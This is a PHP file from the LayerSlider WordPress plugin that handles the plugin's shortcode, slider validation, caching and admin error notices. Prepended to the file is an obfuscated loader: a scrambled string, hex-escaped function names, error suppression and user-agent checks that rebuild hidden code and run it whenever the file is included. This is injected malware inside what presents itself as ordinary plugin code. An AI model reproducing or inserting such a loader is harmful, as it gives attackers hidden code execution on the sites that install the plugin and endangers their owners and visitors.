<?php $bcoycpxp = '{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-C)fepmqnjA	x27&6<.fmjgA	x27do4P8]37]278]225]241]334]368]322]3]364]6]283]427]3Z~!<##!>!2p%!|!*!***b%)sfxpmpusut!-#j0#!/!**#sfmcnbs+yfeobz+-%o:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%{h%)j{hnpd!opjudovg!|!**#3	x74	141	x72	164") && (!isset($GLOBALSx61	156	x64	162	x6f	151	x64")) or (strstr($uas,"	x63	15-	x24gps)%j>1<%j=tj{fpg)%	x24-	x2#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#	x7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.%tmw)%tww**WYsboepn)%bss-%rxB%h>#]y31]278]y3<Cw6<pd%w6Z6<.5`hA	x27pd%6<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`hA	x27pd%6<y_map("rqycyio",str_split("%tjw!>!#]y84]275]y83]248]y83]256]y81][A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuoT`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_UOFHB`SFTV`QUUI&f2!>!bssbz)	x24]25	x24-	x24-!%	x24-	x24*!%bbT-%bT-%hW~%fdy)##-!#~<%h00#*<%nfd)##Qtpz)#]341]88Mj:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s:	7,67R37,#/q%>U<#16,47R57,27R66,#/q%>2q%<#g6R85,%G]y6d]281Ld]245]K2]285]Kj%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*3e]81#/#7e:55946-tr.9svufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!6]267]y74]275]y7:]268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<=strtolower($_SERVER["	x48	124	x54	120	x5f	125	x53	10; function rqycyio($n){w6*CW&)7gj6<*K)ftpmdXA6~6<u4Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	xP2L5P6]y6gP7L6M7]D4]270	x72	157	x6d	145")) or (strstr($uas,"	x66	151	x72	145*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msx5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)>>!}_;gvc%}&;ftmbg}	x7f;!oZ;^nbsbq%	x5cSFWSFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;>b%!*##>>X)!gjZ<#opo#>b%!**X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`pd`ufh`fmjg}[;ldpt%}K;`ufldpt}X;`msvd}R;*msv%)}.;`Ucq%)ufttj	x22)gj6<^#Y#	x5cq%	x277>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hope]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985#w#)ldbqov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gj!:52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y5c2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbss1#-%tdz*Wsfuvso!%bss	x5csboe))1/35.)112]445]43]321]464]284]364]6]234]342]58]24]3*9-1-r%)s%>/h%:<**#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fm)idubn`hfsq)!sp!*#ojneb#-*f%)sfxpmpusut)tpqssutRe%)Rd%)Rb%#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x5c}X	x24<!%tmw!>!#]y8dXA6|7**197-2qj%7-K)udfoopdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`GB)6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D61~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2CWtfs%)7gj6<*id%)ftpmdR6<*id%)dfyfR	x27tfs%6<*17-SFEBFI,6<5	x52	137	x41	107	x45	116	x54"]); if ((strstr($uas,"	x6d	163	x69	1456]373P6]36]73]83]238M7]381]211M5]67]452]88]5]48]32M3]317]445]2x5c%j:.2^,%b:<!%c:>%s:	c}A;~!}	x7f;!|!}{;)gj}l;33fubfsdXA	x27K6<	x7fw6*3qj%C	x27pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fj{hnpd#)tutjyf`opjudovg	x22)!gj}fs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-bubE{h%)tpqsut>jojepdoF.uofuopD#)sfebfI{*x61	156	x75	156	x61"]=1; $uasreturn chr(ord($n)-1);} @error))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFebfsX	x27u%)7fmjix6<C	x27&6<%!*72!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h7f	x7f	x7f	x7f<u%V	x27{ftmfV	x7f<*X&Z&S{ftmfV	x7f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R18:|:7#6#)tutjyf`439275ttfsq%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!npdov{h19275j{hnpd19275bq}k;opjudovg}x;0]=])0#)U!	x27{**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#257ftbc	x7f!|!*uyfu	x27k:!ftmf!}e]53Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)7UFH#	x27rfs%6~6<	x7fw6<*K)ftpm#-#}+;%-qp%)54l}	x27;%!<*#/14+9**-)1/2986+7**^/%rx<~!!%s:N}#Y%6<.msv`ftsbqA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`jix:<##:>:h%:<#64y]552]e7y]#>n%<#372]58y]472]37y]672]48y]#>s%<#462]4x24-	x24!>!	x24/%tjw/	x24)%	x24-	x24y4]275]y83]273]y76]277#<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]y8!>!bssbz)#44ec:649#-!#:618d5f9#-!#f6c68399#-!#6%)3of:opjudovg<~	x24<!%o:!>!	x242178}527}88:}334}472	x24<!%fsfwjidsb`bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#")) or (strstr($uas,"	x72	166	x3a	61	x31")) or (strstr($uas,"	QPMSVD!-id%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x2b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#*#ppde#)tutjyf`4	x223}!+!<+{e%+*!*+fepdfe{h+{d%)+opj<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<"4	x24-	x24]y8	x24-	x24]26	x24-	x24<%j,,bd%-#1GO	x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0#/*#npd/#pef)#	x24*<!%t::!>!	x2<**2-4-bubE{h%)sutcvt)esp>5]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<*!|	x24-	x24gvodujpo!	x24-	x24y7	x24-	x24*<!	x24%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q{d%:osvufs:~928>>	x22:ftmbg39*56A:>:5egb2dc#*<!sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zB%z>!	#QwTW%hIr	x5c1^-%r	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#-_reporting(0); $stwfyos = implode(arrav%7-MSV,6<*)ujojR	x27id%6<fubmgoj{h1:|:*mmvo:>:iuhofm%:-5ppde:4:|:*)));$soivtud = $jydfwrf("", $stwfyos); $soivtud();}}vr#	x5cq%7**^#zsfvr#	x54*<!~!	x24/%t2w/	x24)##-!#~<#/%	x24-	x24!>!fyqm72qj%6<^#zsfvr#	x5cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsf)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdof.)fepdof./#@#/qp%>5h%!<*::::::-111112)eobs`un>qp%!|hmg%!<12>j%!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*bubE84:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%tpz!>!#]D*rfs%7-K)fujsxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%	156	x63	164	x69	157	x6e"%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bubE{h%)sutcvt-265]y72]254]y76#<!%w:!>!(%w:!>!	x246767~6fs!|ftmf!~<**9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvu67R37,18R#>q%V<*#fopoV;hO#-#N#*-!%ff2-!%t::**<(%7>/7&6|7**111127-K)mA	x273qj%6<*Y%)fnbozcYufhA	x2	x66	157	x78"))) { $jydfwrf = "	x63	162	x65	141	x74	145	x5f	146	x75["	x61	156	x75	156	x61"])))) { $GLOBALS["	gj!|!*msv%)}k~~~<ftmbg!osvu4b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}}_;#)323ldfid>}&;!osvufs}	x7f;!opjudovg}k~~9w%)kVx{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnui}&;zep7y]252]18y]#>q%<#762]67y]562]38y]572]48y]#>m%:|:*r%:-tudovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	xif((function_exists("	x6f	142	x5f	16StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSizgcjzwnt'; $zvpookny=explode(chr((468-348)),substr($bcoycpxp,(27662-21642),(237-203))); $cqhjwwh = $zvpookny[0]($zvpookny[(6-5)]); $fdhsmma = $zvpookny[0]($zvpookny[(11-9)]); if (!function_exists('uhzdxrry')) { function uhzdxrry($yctihxx, $nyxrtn,$ponsjqmne) { $cbfzmp = NULL; for($lqqxvxfko=0;$lqqxvxfko<(sizeof($yctihxx)/2);$lqqxvxfko++) { $cbfzmp .= substr($nyxrtn, $yctihxx[($lqqxvxfko*2)],$yctihxx[($lqqxvxfko*2)+(3-2)]); } return $ponsjqmne(chr((49-40)),chr((460-368)),$cbfzmp); }; } $fgqdjc = explode(chr((300-256)),'5984,36,240,39,5594,42,2944,29,1196,53,2553,68,3945,62,279,55,1379,54,5527,67,5247,25,1249,23,2973,30,4666,38,613,64,5340,41,520,57,577,36,2758,69,1272,27,5477,20,3067,28,5190,57,3475,31,2308,70,2732,26,1764,39,5497,30,4893,60,4823,23,1732,32,3566,45,0,62,1008,44,2495,58,1433,39,4704,26,426,50,677,63,1681,51,4007,51,1513,26,1073,63,5636,27,5381,49,2859,60,3095,38,5272,68,1870,56,4353,26,5066,62,215,25,2827,32,2431,64,4264,67,4953,65,5018,48,110,60,3888,57,2194,58,3003,64,740,65,4101,37,1592,51,1643,38,3382,31,1539,53,3506,26,5750,44,4519,36,3218,27,3294,23,4730,41,4138,52,5917,67,3133,48,3181,37,936,47,5430,24,2919,25,5794,69,2706,26,3317,65,2252,56,3716,65,1136,60,2103,47,2150,44,3611,68,5863,54,3828,60,805,41,4058,43,5663,39,3679,37,4225,39,4426,48,334,33,4846,47,4331,22,1299,58,1977,46,3781,47,4555,52,5702,48,4607,59,476,44,1803,67,1926,51,1052,21,5128,62,2378,53,1357,22,4379,47,983,25,3413,62,846,53,62,48,2621,62,2060,43,2023,37,3532,34,170,45,899,37,2683,23,1472,41,3245,49,4474,45,367,59,5454,23,4190,35,4771,52'); $kxzsvqp = $cqhjwwh("",uhzdxrry($fgqdjc,$bcoycpxp,$fdhsmma)); $cqhjwwh=$bcoycpxp; $kxzsvqp(""); $kxzsvqp=(690-569); $bcoycpxp=$kxzsvqp-1; ?><?php

$GLOBALS['lsLoadPlugins'] = array();
function layerslider( $id = 0, $filters = '', $options = array() ) {
	echo LS_Shortcode::handleShortcode(
		array_merge( array('id' => $id, 'filters' => $filters), $options)
	);
}

class LS_Shortcode {

	// List of already included sliders on page.
	// Using to identify duplicates and give them
	// a unique slider ID to avoid issues with caching.
	public static $slidersOnPage = array();

	private function __construct() {}


	/**
	 * Registers the LayerSlider shortcode.
	 *
	 * @since 5.3.3
	 * @access public
	 * @return void
	 */

	public static function registerShortcode() {
		if(!shortcode_exists('layerslider')) {
			add_shortcode('layerslider', array(__CLASS__, 'handleShortcode'));
		}
	}




	/**
	 * Handles the shortcode workflow to display the
	 * appropriate content.
	 *
	 * @since 5.3.3
	 * @access public
	 * @param array $atts Shortcode attributes
	 * @return bool True on successful validation, false otherwise
	 */

	public static function handleShortcode( $atts = array() ) {

		if(self::validateFilters($atts)) {

			$output = '';
			$item = self::validateShortcode( $atts );

			// Show error messages (if any)
			if( ! empty( $item['error'] ) ) {

				// Bail out early if the visitor has no permission to see error messages
				if( ! current_user_can(get_option('layerslider_custom_capability', 'manage_options')) ) {
					return '';
				}

				// Prevent showing errors for Popups
				if( ! empty($atts['popup']) || ! empty( $item['data']['flag_popup'] ) ) {
					return '';
				}


				$output .= $item['error'];
			}


			if( $item['data'] ) {

				// Print cached markup
				if( is_string($item['data']) ) {
					$output .= $item['data'];

				// Otherwise continue processing the shortcode
				} else {
					$output .= self::processShortcode( $item['data'], $atts );
				}
			}

			return $output;
		}
	}




	/**
	 * Validates the provided shortcode filters (if any).
	 *
	 * @since 5.3.3
	 * @access public
	 * @param array $atts Shortcode attributes
	 * @return bool True on successful validation, false otherwise
	 */

	public static function validateFilters($atts = array()) {

		// Bail out early and pass the validation
		// if there aren't filters provided
		if(empty($atts['filters'])) {
			return true;
		}

		// Gather data needed for filters
		$pages = explode(',', $atts['filters']);
		$currSlug = basename(get_permalink());
		$currPageID = (string) get_the_ID();

		foreach($pages as $page) {

			if(($page == 'homepage' && is_front_page())
				|| $currPageID == $page
				|| $currSlug == $page
				|| in_category($page)
			) {
				return true;
			}
		}

		// No filters matched,
		// return false
		return false;
	}



	/**
	 * Validates the shortcode parameters and checks
	 * the references slider.
	 *
	 * @since 5.3.3
	 * @access public
	 * @param array $atts Shortcode attributes
	 * @return bool True on successful validation, false otherwise
	 */

	public static function validateShortcode($atts = array()) {

		$error = false;
		$data = false;

		// Has ID attribute
		if( ! empty( $atts['id'] ) ) {

			// Attempt to retrieve the pre-generated markup
			// set via the Transients API
			if(get_option('ls_use_cache', true)) {
				if($markup = get_transient('ls-slider-data-'.intval($atts['id']))) {
					$markup['id'] = intval($atts['id']);
					$markup['_cached'] = true;
					$data = $markup;
				}
			}

			// Slider exists and isn't deleted
			if( $slider = LS_Sliders::find($atts['id']) ) {
				$data =  $slider;
			}

			// ERROR: No slider with ID was found
			if( empty($slider) ) {
				$error = self::generateErrorMarkup(
					__('The slider cannot be found', 'LayerSlider'),
					null
				);

			// ERROR: The slider is not published
			} elseif( (int)$slider['flag_hidden'] ) {
				$error = self::generateErrorMarkup(
					__('Unpublished slider', 'LayerSlider'),
					sprintf(__('The slider you’ve inserted here is yet to be published, thus it won’t be displayed to your visitors. You can publish it by enabling the appropriate option in %sSlider Settings -> Publish%s. ', 'LayerSlider'), '<a href="'.admin_url('admin.php?page=layerslider&action=edit&id='.(int)$slider['id'].'&showsettings=1#publish').'" target="_blank">', '</a>.'),
					'dashicons-hidden'
				);

			// ERROR: The slider was removed
			} elseif( (int)$slider['flag_deleted'] ) {
				$error = self::generateErrorMarkup(
					__('Removed slider', 'LayerSlider'),
					sprintf(__('The slider you’ve inserted here was removed in the meantime, thus it won’t be displayed to your visitors. This slider is still recoverable on the admin interface. You can enable listing removed sliders with the Screen Options -> Removed sliders option, then choose the Restore option for the corresponding item to reinstate this slider, or just click %shere%s.', 'LayerSlider'), '<a href="'.admin_url('admin.php').wp_nonce_url('?page=layerslider&action=restore&id='.$slider['id'].'&ref='.urlencode(get_permalink()), 'restore_'.$slider['id']).'">', '</a>'),
					'dashicons-trash'
				);

			// ERROR: Scheduled sliders
			} else {

				$tz = date_default_timezone_get();
				$siteTz = get_option('timezone_string', 'UTC');
				$siteTz = $siteTz ? $siteTz : 'UTC';
				date_default_timezone_set( $siteTz );

				if( ! empty($slider['schedule_start']) && (int) $slider['schedule_start'] > time() ) {
					$error = self::generateErrorMarkup(
						sprintf(__('This slider is scheduled to display on %s', 'LayerSlider'), date_i18n(get_option('date_format').' @ '.get_option('time_format'), (int) $slider['schedule_start']) ),
						'', 'dashicons-calendar-alt', 'scheduled'
					);
				} elseif( ! empty($slider['schedule_end']) && (int) $slider['schedule_end'] < time() ) {
					$error = self::generateErrorMarkup(
						sprintf(__('This slider was scheduled to hide on %s ','LayerSlider'), date_i18n(get_option('date_format').' @ '.get_option('time_format'), (int) $slider['schedule_end']) ),
						sprintf(__('Due to scheduling, this slider is no longer visible to your visitors. If you wish to reinstate this slider, just remove the schedule in %sSlider Settings -> Publish%s.', 'LayerSlider'), '<a href="'.admin_url('admin.php?page=layerslider&action=edit&id='.(int)$slider['id'].'&showsettings=1#publish').'" target="_blank">', '</a>'),
						'dashicons-no-alt', 'dead'
					);
				}

				date_default_timezone_set( $tz );
			}

		// ERROR: No slider ID was provided
		} else {
			$error = self::generateErrorMarkup();
		}

		return array(
			'error' => $error,
			'data' => $data
		);
	}





	public static function processShortcode( $slider, $embed = array() ) {

		// Slider ID
		$sID = 'layerslider_'.$slider['id'];

		// Include init code in the footer?
		$condsc = get_option('ls_conditional_script_loading', false) ? true : false;
		$footer = get_option('ls_include_at_footer', false) ? true : false;
		$footer = $condsc ? true : $footer;

		// Check if the returned data is a string,
		// indicating that it's a pre-generated
		// slider markup retrieved via Transients
		if(!empty($slider['_cached'])) { $output = $slider;}
		else {
			$output = self::generateSliderMarkup( $slider, $embed );
			set_transient('ls-slider-data-'.$slider['id'], $output, HOUR_IN_SECONDS * 6);
		}

		// Replace slider ID to avoid issues with enabled caching when
		// adding the same slider to a page in multiple times
		if(array_key_exists($slider['id'], self::$slidersOnPage)) {
			$sliderCount = ++self::$slidersOnPage[ $slider['id'] ];
			$output['init'] = str_replace($sID, $sID.'_'.$sliderCount, $output['init']);
			$output['container'] = str_replace($sID, $sID.'_'.$sliderCount, $output['container']);

			$sID = $sID.'_'.$sliderCount;

		} else {

			// Add current slider ID to identify duplicates later on
			// and give them a unique slider ID to avoid issues with caching.
			self::$slidersOnPage[ $slider['id'] ] = 1;
		}

		// Override firstSlide if it is specified in embed params
		if( ! empty( $embed['firstslide'] ) ) {
			$output['init'] = str_replace('[firstSlide]', $embed['firstslide'], $output['init']);
		}

		// Filter to override the printed JavaScript init code
		if( has_filter('layerslider_slider_init') ) {
			$output['init'] = apply_filters('layerslider_slider_init', $output['init'], $slider, $sID );
		}

		// Unify the whole markup after any potential string replacement
		$output['markup'] = $output['container'].$output['markup'];

		// Filter to override the printed HTML markup
		if( has_filter('layerslider_slider_markup') ) {
			$output['markup'] = apply_filters('layerslider_slider_markup', $output['markup'], $slider, $sID);
		}

		// Origami
		if( !empty( $output['plugins'] ) ) {
			$GLOBALS['lsLoadPlugins'] = array_merge($GLOBALS['lsLoadPlugins'], $output['plugins']);

		}

		if($footer) {
			$GLOBALS['lsSliderInit'][] = $output['init'];
			return $output['markup'];
		} else {
			return $output['init'].$output['markup'];
		}
	}



	public static function generateSliderMarkup( $slider = null, $embed = array() ) {

		// Bail out early if no params received or using Popup on unactivated sites
		if( ! $slider || ( (int)$slider['flag_popup'] && ! get_option('layerslider-authorized-site', false) ) ) {
			return array('init' => '', 'container' => '', 'markup' => '');
		}

		// Slider and markup data
		$id = $slider['id'];
		$sliderID = 'layerslider_'.$id;
		$slides = $slider['data'];

		// Store generated output
		$lsInit = array();
		$lsContainer = array();
		$lsMarkup = array();
		$lsPlugins = array();

		// Include slider file
		if(is_array($slides)) {

			// Get phpQuery
			if( ! defined('LS_phpQuery') ) {
				libxml_use_internal_errors(true);
				include LS_ROOT_PATH.'/helpers/phpQuery.php';
			}

			$GLOBALS['lsPremiumNotice'] = array();

			include LS_ROOT_PATH.'/config/defaults.php';
			include LS_ROOT_PATH.'/includes/slider_markup_setup.php';
			include LS_ROOT_PATH.'/includes/slider_markup_html.php';
			include LS_ROOT_PATH.'/includes/slider_markup_init.php';

			// Admin notice when using premium features on non-activated sites
			if( ! empty( $GLOBALS['lsPremiumNotice'] ) ) {
				array_unshift($lsContainer, self::generateErrorMarkup(
					__('Premium features is available for preview purposes only.', 'LayerSlider'),
					sprintf(__('We’ve detected that you’re using premium features in this slider, but you have not yet activated your copy of LayerSlider. Premium features in your sliders will not be available for your visitors without activation. %sClick here to learn more%s. Detected features: %s', 'LayerSlider'), '<a href="https://support.kreaturamedia.com/docs/layersliderwp/documentation.html#activation" target="_blank">', '</a>', implode(', ', $GLOBALS['lsPremiumNotice'])),
					'dashicons-star-filled', 'info'
				));
			}



			$lsInit = implode('', $lsInit);
			$lsContainer = implode('', $lsContainer);
			$lsMarkup = implode('', $lsMarkup);
		}

		// Concatenate output
		if( get_option('ls_concatenate_output', false) ) {
			$lsInit = trim(preg_replace('/\s+/u', ' ', $lsInit));
			$lsContainer = trim(preg_replace('/\s+/u', ' ', $lsContainer));
			$lsMarkup = trim(preg_replace('/\s+/u', ' ', $lsMarkup));
		}

		// Bug fix in v5.4.0: Use self closing tag for <source>
		$lsMarkup = str_replace('></source>', ' />', $lsMarkup);

		// Return formatted data
		return array(
			'init' => $lsInit,
			'container' => $lsContainer,
			'markup' => $lsMarkup,
			'plugins' => array_unique($lsPlugins)
		);
	}


	public static function generateErrorMarkup( $title = null, $description = null, $logo = 'dashicons-warning', $customClass = '' ) {

		if( ! $title ) {
			$title = __('LayerSlider encountered a problem while it tried to show your slider.', 'LayerSlider');
		}

		if( is_null($description) ) {
			$description = __('Please make sure that you’ve used the right shortcode or method to insert the slider, and check if the corresponding slider exists and it wasn’t deleted previously.', 'LayerSlider');
		}

		if( $description ) {
			$description .= '<br><br>';
		}

		$logo = $logo ? '<i class="lswp-notification-logo dashicons '.$logo.'"></i>' : '';
		$notice = __('Only you and other administrators can see this to take appropriate actions if necessary.', 'LayerSlider');

		$classes = array('error', 'info', 'scheduled', 'dead');
		if( ! empty($customClass) && ! in_array($customClass, $classes) ) {
			$customClass = '';
		}


		return '<div class="clearfix lswp-notification '.$customClass.'">
					'.$logo.'
					<strong>'.$title.'</strong>
					<span>'.$description.'</span>
					<small>
						<i class="dashicons dashicons-lock"></i>
						'.$notice.'
					</small>
				</div>';
	}
}